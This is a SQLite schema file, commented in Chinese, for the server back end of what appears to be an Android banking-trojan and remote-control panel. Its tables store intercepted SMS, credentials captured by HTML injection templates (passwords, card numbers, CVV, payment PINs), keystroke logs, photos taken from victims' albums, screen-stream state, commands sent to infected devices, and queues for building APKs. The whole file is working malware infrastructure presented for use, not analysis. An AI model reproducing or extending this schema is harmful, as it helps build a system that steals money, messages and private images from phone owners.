-- ============================================================================
-- 花木工作室 SQLite 数据库 Schema（参考文档）
-- ----------------------------------------------------------------------------
-- 实际建库由 server.js 启动时自动执行（CREATE TABLE IF NOT EXISTS，幂等），
-- 本文件仅作为完整 Schema 的权威参考，手工建库/审查时使用：
--   sqlite3 /root/xyzcs_replica.db < schema.sql
-- 运行时参数：journal_mode=WAL / synchronous=NORMAL / busy_timeout=3000
-- 数据库路径：/root/xyzcs_replica.db（server.js DB_PATH 常量）
-- ============================================================================

-- 设备表：每台设备一行，全部字段打包在 data(JSON) 里（id=android_id）
CREATE TABLE IF NOT EXISTS devices(id TEXT PRIMARY KEY, data TEXT);

-- 短信：agent 上报短信入库（is_read 0/1，source 采集来源）
CREATE TABLE IF NOT EXISTS sms(
  id INTEGER PRIMARY KEY, device_id TEXT, device_label TEXT,
  sender TEXT, body TEXT, recv_at TEXT, is_read INTEGER,
  source TEXT, create_at TEXT
);

-- 凭据：注入模板收集的账号/银行卡/支付密码等
CREATE TABLE IF NOT EXISTS credentials(
  id INTEGER PRIMARY KEY, device_id TEXT, device_label TEXT,
  app_name TEXT, app_pkg TEXT, login TEXT, password TEXT,
  card TEXT, cvv TEXT, exp_date TEXT, pay_pin TEXT,
  type TEXT, capt_at TEXT, extra TEXT
);

-- 键盘记录：/s/il 批量入库（app_pkg 来源应用，log_type LOG/…）
CREATE TABLE IF NOT EXISTS keylogs(
  id INTEGER PRIMARY KEY, device_id TEXT, app_pkg TEXT,
  log_type TEXT, text TEXT, capt_at TEXT
);

-- IP 黑名单：登录/接入防护
CREATE TABLE IF NOT EXISTS blacklist(
  id INTEGER PRIMARY KEY, ip TEXT, device_id TEXT,
  reason TEXT, created_at TEXT
);

-- 设备分组
CREATE TABLE IF NOT EXISTS groups(
  id INTEGER PRIMARY KEY, name TEXT, device_count INTEGER
);

-- 公告（若依 RuoYi sys_notice 风格，noticeContent 支持 HTML 富文本）
CREATE TABLE IF NOT EXISTS notices(
  noticeId INTEGER PRIMARY KEY, noticeTitle TEXT, noticeContent TEXT,
  noticeType INTEGER, status INTEGER, createBy TEXT,
  createTime TEXT, updateTime TEXT
);

-- 站内通知（面板消息中心，is_read 0/1）
CREATE TABLE IF NOT EXISTS notifications(
  id INTEGER PRIMARY KEY, title TEXT, body TEXT,
  level TEXT, is_read INTEGER DEFAULT 0, created_at TEXT
);

-- 相册：缩略图/原图 BLOB（id=md5(dev+path)[:16]，上限 150 张/原图 8MB）
CREATE TABLE IF NOT EXISTS album(
  id TEXT PRIMARY KEY, device_id TEXT, display_name TEXT,
  path TEXT, size INTEGER, mtime INTEGER,
  thumb BLOB, orig BLOB, fetched_at TEXT
);
CREATE INDEX IF NOT EXISTS idx_album_dev ON album(device_id);

-- 键值存储：屏幕流激活集合等运行态持久化（服务重启不丢）
CREATE TABLE IF NOT EXISTS kv(k TEXT PRIMARY KEY, v TEXT);

-- 命令历史：面板下发命令流水（status: sent/done）
CREATE TABLE IF NOT EXISTS commands(
  id INTEGER PRIMARY KEY, device_id TEXT, command TEXT,
  payload TEXT, status TEXT, created_at TEXT
);

-- 泛型存储：按 store 分库的 JSON 记录
--   store='builds'        APK 构建记录（构建工人队列，status=pending/building/done）
--   store='injection'     注入模板（g_add 存 HTML）
--   store='abuild_config' 自动构建配置
--   store='abuild_targets' 自动构建目标
CREATE TABLE IF NOT EXISTS generic(
  store TEXT, id TEXT PRIMARY KEY, data TEXT, updated_at TEXT
);

CREATE INDEX IF NOT EXISTS idx_kl_dev ON keylogs(device_id);
CREATE INDEX IF NOT EXISTS idx_sms_dev ON sms(device_id);
CREATE INDEX IF NOT EXISTS idx_cred_dev ON credentials(device_id);
